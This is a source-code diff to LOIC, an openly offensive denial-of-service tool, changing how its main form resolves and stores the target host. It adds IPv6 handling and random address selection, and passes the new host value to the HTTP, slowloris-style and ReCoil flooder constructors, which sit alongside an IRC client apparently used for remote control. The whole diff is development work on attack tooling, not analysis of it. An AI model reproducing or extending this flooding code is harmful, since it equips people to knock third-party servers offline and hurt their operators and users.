@@ -24,11 +24,10 @@ namespace LOIC
 		private List<IFlooder> arr = new List<IFlooder>();
 		private StringCollection aUpOLSites = new StringCollection();
 		private StringCollection aDownOLSites = new StringCollection();
-		private bool bIsHidden = false;
-		private string sMethod, sData, sSubsite, sTargetDNS = "", sTargetIP = "";
+		private bool bIsHidden = false, bResp, intShowStats;
+		private string sMethod, sData, sSubsite, sTargetHost = "", sTargetIP = "";
 		private int iPort, iThreads, iDelay, iTimeout, iSockspThread;
 		private Protocol protocol;
-		private bool bResp, intShowStats;
 		private IrcClient irc;
 		private Thread irclisten;
 		private string channel;
@@ -109,7 +108,7 @@ namespace LOIC
 					}
 
 					sTargetIP = txtTarget.Text;
-					if (String.IsNullOrEmpty(sTargetIP) || String.Equals(sTargetIP, "N O N E !"))
+					if (String.IsNullOrEmpty(sTargetIP) || String.IsNullOrEmpty(sTargetHost) || String.Equals(sTargetIP, "N O N E !"))
 						throw new Exception("Select a target.");
 
 					sMethod = cbMethod.Text;
@@ -146,7 +145,6 @@ namespace LOIC
 					}
 
 					bResp = chkResp.Checked;
-					sTargetDNS = txtTargetURL.Text;
 
 					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil)
 					{
@@ -186,15 +184,15 @@ namespace LOIC
 
 					if (protocol == Protocol.ReCoil)
 					{
-						ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+						ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
 					}
 					if (protocol == Protocol.slowLOIC)
 					{
-						ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+						ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
 					}
 					if (protocol == Protocol.HTTP)
 					{
-						ts = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+						ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
 					}
 					if ((int)protocol == 2 || (int)protocol == 1)
 					{
@@ -253,12 +251,32 @@ namespace LOIC
 		/// <param name="silent">Silent?</param>
 		private void LockOnIP(bool silent = false)
 		{
-			if (txtTargetIP.Text.Trim().ToLowerInvariant().Length == 0)
+			try
 			{
-				Wtf ("I think you forgot the IP.", silent);
-				return;
+				string tIP = txtTargetIP.Text.Trim().ToLowerInvariant();
+				if(tIP.Length == 0)
+				{
+					Wtf ("I think you forgot the IP.", silent);
+					return;
+				}
+				try
+				{
+					txtTarget.Text = sTargetHost = sTargetIP = IPAddress.Parse(tIP).ToString();
+					if(sTargetHost.Contains(":"))
+					{
+						sTargetHost = "[" + sTargetHost.Trim('[', ']') + "]";
+					}
+				}
+				catch(FormatException)
+				{
+					Wtf ("I don't think an IP is supposed to be written like THAT.", silent);
+					return;
+				}
 			}
-			txtTarget.Text = txtTargetIP.Text.Trim().ToLowerInvariant();
+			catch(Exception ex)
+			{
+				Wtf (ex.Message, silent);
+			}
 		}
 
 		/// <summary>
@@ -278,7 +296,7 @@ namespace LOIC
 			try
 			{
 				var turi = new Uri(url).Host;
-				txtTarget.Text = Dns.GetHostEntry(turi).AddressList[0].ToString();
+				txtTarget.Text = (Functions.RandomElement(Dns.GetHostEntry(turi).AddressList) as IPAddress).ToString();
 				txtTargetURL.Text = turi;
 			}
 			catch (Exception)
@@ -907,15 +925,15 @@ namespace LOIC
 
 							if (protocol == Protocol.ReCoil)
 							{
-								ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+								ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
 							}
 							if (protocol == Protocol.slowLOIC)
 							{
-								ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+								ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
 							}
 							if (protocol == Protocol.HTTP)
 							{
-								ts = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+								ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
 							}
 							if ((int)protocol == 2 || (int)protocol == 1)
 							{
@@ -947,15 +965,15 @@ namespace LOIC
 
 						if (protocol == Protocol.ReCoil)
 						{
-							ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+							ts = new ReCoil(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
 						}
 						if (protocol == Protocol.slowLOIC)
 						{
-							ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+							ts = new SlowLoic(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
 						}
 						if (protocol == Protocol.HTTP)
 						{
-							ts = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+							ts = new HTTPFlooder(sTargetHost, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
 						}
 						if ((int)protocol == 2 || (int)protocol == 1)
 						{
